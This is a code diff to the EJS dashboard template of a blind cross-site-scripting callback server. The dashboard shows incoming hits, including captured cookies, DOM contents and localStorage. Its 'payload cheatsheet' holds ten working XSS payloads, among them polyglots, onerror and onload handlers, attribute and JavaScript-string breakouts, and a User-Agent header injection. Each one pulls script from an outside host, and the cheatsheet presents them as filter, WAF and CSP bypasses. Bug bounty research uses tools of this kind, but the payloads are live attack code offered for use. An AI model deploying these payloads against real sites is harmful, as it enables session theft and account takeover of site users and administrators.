@@ -10,7 +10,7 @@
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     :root {
       --bg: #080b0f; --surface: #0d1117; --surface2: #111820;
-      --border: #1e2d3d; --accent: #00ff88; --accent-dim: rgba(0,255,136,0.1);
+      --border: #1e2d3d; --accent: #00ff88;
       --text: #c9d1d9; --muted: #484f58; --danger: #ff4757; --warning: #ffa502;
     }
     body { background: var(--bg); color: var(--text); font-family: 'Share Tech Mono', monospace; min-height: 100vh; }
@@ -42,9 +42,9 @@
     .hit-ua { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--muted); width: 20%; font-size: 11px; }
     .badge { display: inline-block; padding: 2px 8px; font-size: 10px; border: 1px solid; white-space: nowrap; }
     .badge-green { color: var(--accent); border-color: rgba(0,255,136,0.3); background: rgba(0,255,136,0.05); }
-    .action-link { color: var(--accent); text-decoration: none; font-size: 11px; letter-spacing: 1px; white-space: nowrap; }
+    .action-link { color: var(--accent); text-decoration: none; font-size: 11px; white-space: nowrap; }
     .action-link:hover { text-decoration: underline; }
-    .pagination { display: flex; align-items: center; gap: 8px; margin-top: 24px; justify-content: center; }
+    .pagination { display: flex; gap: 8px; margin-top: 24px; justify-content: center; }
     .page-link { padding: 6px 12px; border: 1px solid var(--border); color: var(--muted); text-decoration: none; font-size: 12px; transition: all 0.15s; }
     .page-link:hover, .page-link.active { border-color: var(--accent); color: var(--accent); }
     .cheatsheet { margin-top: 48px; }
@@ -59,13 +59,7 @@
     .tag-high { color: var(--accent); border-color: rgba(0,255,136,0.3); }
     .tag-med { color: var(--warning); border-color: rgba(255,165,2,0.3); }
     .tag-low { color: var(--muted); border-color: var(--border); }
-    .payload-code {
-      background: var(--surface2); border: 1px solid var(--border);
-      padding: 12px 14px; font-size: 11px; color: var(--accent);
-      word-break: break-all; line-height: 1.6; cursor: pointer;
-      transition: border-color 0.15s; position: relative;
-      white-space: pre-wrap; user-select: all;
-    }
+    .payload-code { background: var(--surface2); border: 1px solid var(--border); padding: 12px 14px; padding-right: 80px; font-size: 11px; color: var(--accent); word-break: break-all; line-height: 1.6; cursor: pointer; transition: border-color 0.15s; position: relative; white-space: pre-wrap; }
     .payload-code:hover { border-color: var(--accent); }
     .payload-code::after { content: 'click to copy'; position: absolute; top: 6px; right: 10px; font-size: 9px; color: var(--muted); letter-spacing: 1px; }
     .toast { position: fixed; bottom: 24px; right: 24px; background: var(--surface); border: 1px solid var(--accent); color: var(--accent); padding: 12px 20px; font-size: 12px; opacity: 0; transform: translateY(10px); transition: all 0.3s; pointer-events: none; z-index: 999; }
@@ -92,7 +86,6 @@
 </header>
 
 <main class="main">
-
   <div class="stats">
     <div class="stat-card">
       <div class="stat-label">Total Hits</div>
@@ -105,7 +98,7 @@
     <div class="stat-card">
       <div class="stat-label">Latest Hit</div>
       <div class="stat-value" style="font-size:16px;padding-top:6px;">
-        <%= hits.length > 0 ? new Date(hits[0].created_at).toLocaleDateString() : '—' %>
+        <%= hits.length > 0 ? new Date(hits[0].created_at).toLocaleDateString() : '&mdash;' %>
       </div>
     </div>
   </div>
@@ -114,20 +107,18 @@
   <div class="section-title">// incoming callbacks</div>
   <table class="hits-table">
     <thead>
-      <tr>
-        <th>ID</th><th>URL</th><th>IP</th><th>Time</th><th>User Agent</th><th>Data</th><th></th>
-      </tr>
+      <tr><th>ID</th><th>URL</th><th>IP</th><th>Time</th><th>User Agent</th><th>Data</th><th></th></tr>
     </thead>
     <tbody>
       <% hits.forEach(function(hit) { %>
       <tr>
         <td><span class="hit-id"><%= hit.id %></span></td>
-        <td class="hit-url" title="<%= hit.origin_url || '' %>"><%= hit.origin_url || '—' %></td>
-        <td><span class="hit-ip"><%= hit.ip || '—' %></span></td>
+        <td class="hit-url"><%= hit.origin_url || '&mdash;' %></td>
+        <td><span class="hit-ip"><%= hit.ip || '&mdash;' %></span></td>
         <td class="hit-time"><%= new Date(hit.created_at).toLocaleString() %></td>
-        <td class="hit-ua"><%= hit.user_agent || '—' %></td>
+        <td class="hit-ua"><%= hit.user_agent || '&mdash;' %></td>
         <td>
-          <% if (hit.cookies && hit.cookies !== '{}') { %><span class="badge badge-green">🍪</span> <% } %>
+          <% if (hit.cookies && hit.cookies !== '{}') { %><span class="badge badge-green">cookies</span> <% } %>
           <% if (hit.dom) { %><span class="badge badge-green">DOM</span> <% } %>
           <% if (hit.local_storage && hit.local_storage !== '{}') { %><span class="badge badge-green">LS</span><% } %>
         </td>
@@ -145,85 +136,88 @@
   <% } %>
   <% } %>
 
-  <!-- Payload Cheatsheet -->
   <div class="cheatsheet">
     <div class="section-title">// payload cheatsheet — click any to copy</div>
     <div class="cheatsheet-grid" id="cheatsheet"></div>
   </div>
-
 </main>
 
-<div class="toast" id="toast">✓ Copied to clipboard</div>
+<div class="toast" id="toast">Copied to clipboard</div>
 
 <script>
-  // All payloads defined in JS so they are never parsed as HTML
-  var HOST = 'https://<%- (process.env.SERVER_URL || 'https://dmtanalytics.net').replace('https://','').replace('http://','') %>';
+(function() {
+  // HOST is hardcoded at render time by EJS into a JS string
+  // We use JSON.stringify to safely escape it — no raw EJS in script blocks
+  var HOST = <%- JSON.stringify(process.env.SERVER_URL || 'https://dmtanalytics.net') %>;
 
   var payloads = [
     {
       title: 'Classic Script Tag',
       tag: 'MOST USED', tagClass: 'tag-high',
       desc: 'Standard injection. Works wherever script tags are not stripped. Your go-to first attempt.',
-      code: '<script src="' + HOST + '/t"><\/script>'
+      code: function(h) { return '<script src="' + h + '/t"><' + '/script>'; }
     },
     {
       title: 'Polyglot Prefix + Script',
       tag: 'NAHAMSEC STYLE', tagClass: 'tag-high',
       desc: 'Breaks out of HTML attributes, JS strings, and tag contexts simultaneously before firing.',
-      code: '\'";></noscript></title></textarea></style></template></script><script src="' + HOST + '/t"><\/script>'
+      code: function(h) { return '\'";></noscript></title></textarea></style></template></' + 'script><script src="' + h + '/t"><' + '/script>'; }
     },
     {
       title: 'import() — Modern Browsers',
       tag: 'RECOMMENDED', tagClass: 'tag-high',
       desc: 'Dynamic import() bypasses many script-src CSP rules. Preferred by Bugcrowd researchers.',
-      code: '<img src=x onerror="import(\'' + HOST + '/t\')">'
+      code: function(h) { return '<img src=x onerror="import(\'' + h + '/t\')">'; }
     },
     {
       title: 'SVG onload',
       tag: 'FILTER BYPASS', tagClass: 'tag-med',
       desc: 'Works when script tags are filtered but SVG is allowed. Common in rich text editors.',
-      code: '<svg onload="var s=document.createElement(\'script\');s.src=\'' + HOST + '/t\';document.head.appendChild(s)">'
+      code: function(h) { return '<svg onload="var s=document.createElement(\'script\');s.src=\'' + h + '/t\';document.head.appendChild(s)">'; }
     },
     {
       title: 'img onerror + createElement',
       tag: 'NO SCRIPT TAG', tagClass: 'tag-med',
       desc: 'No script tag needed. Fires via broken image handler. Works when script tags are blocked.',
-      code: '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'' + HOST + '/t\';document.body.appendChild(s)">'
+      code: function(h) { return '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'' + h + '/t\';document.body.appendChild(s)">'; }
     },
     {
       title: 'Blind HTML Probe (no JS)',
       tag: 'WAF BYPASS', tagClass: 'tag-med',
-      desc: 'Zero JS — just an img tag. Fires a GET to confirm injection exists before sending full payload.',
-      code: '<img src="' + HOST + '/callback?url=probe">'
+      desc: 'Zero JS. Just an img tag GET to confirm injection point exists before sending full payload.',
+      code: function(h) { return '<img src="' + h + '/callback?url=probe">'; }
     },
     {
       title: 'Attribute Injection + onfocus',
       tag: 'ATTRIBUTE CONTEXT', tagClass: 'tag-med',
-      desc: 'When your input lands inside an HTML attribute value. Breaks out and fires on focus.',
-      code: '" onfocus="var s=document.createElement(\'script\');s.src=\'' + HOST + '/t\';document.head.appendChild(s)" autofocus="'
+      desc: 'When your input lands inside an HTML attribute. Breaks out and fires on focus.',
+      code: function(h) { return '" onfocus="var s=document.createElement(\'script\');s.src=\'' + h + '/t\';document.head.appendChild(s)" autofocus="'; }
     },
     {
       title: 'JS String Break',
       tag: 'JS CONTEXT', tagClass: 'tag-med',
-      desc: 'When your input is reflected inside a JavaScript string. Breaks out and injects a fresh script tag.',
-      code: '\';<\/script><script src="' + HOST + '/t"><\/script><script>\''
+      desc: 'When input is reflected inside a JavaScript string. Breaks out and injects a fresh script tag.',
+      code: function(h) { return '\';</' + 'script><script src="' + h + '/t"><' + '/script><script>\''; }
     },
     {
       title: 'User-Agent / HTTP Header',
       tag: 'HEADER INJECTION', tagClass: 'tag-low',
       desc: 'Inject into User-Agent, Referer, X-Forwarded-For. Fires when admins view server logs.',
-      code: '<script src="' + HOST + '/t"><\/script>'
+      code: function(h) { return '<script src="' + h + '/t"><' + '/script>'; }
     },
     {
       title: 'Full Polyglot (Kitchen Sink)',
       tag: 'SPRAY & PRAY', tagClass: 'tag-low',
-      desc: 'Breaks HTML, JS strings, attributes, and template contexts. Use when you don\'t know the context. Based on 0xSobky\'s polyglot.',
-      code: 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><img/src/onerror=import(\'' + HOST + '/t\')>'
+      desc: 'Breaks HTML, JS strings, attributes, and template contexts. Based on 0xSobky polyglot.',
+      code: function(h) { return 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></' + 'script><img/src/onerror=import(\'' + h + '/t\')>'; }
     }
   ];
 
   var grid = document.getElementById('cheatsheet');
+
   payloads.forEach(function(p) {
+    var text = p.code(HOST);
+
     var card = document.createElement('div');
     card.className = 'payload-card';
 
@@ -247,9 +241,10 @@
 
     var code = document.createElement('div');
     code.className = 'payload-code';
-    code.textContent = p.code; // textContent = never parsed as HTML
+    code.textContent = text;
+
     code.addEventListener('click', function() {
-      navigator.clipboard.writeText(p.code).then(function() {
+      navigator.clipboard.writeText(text).then(function() {
         var t = document.getElementById('toast');
         t.classList.add('show');
         setTimeout(function() { t.classList.remove('show'); }, 2000);
@@ -261,6 +256,7 @@
     card.appendChild(code);
     grid.appendChild(card);
   });
+})();
 </script>
 
 </body>
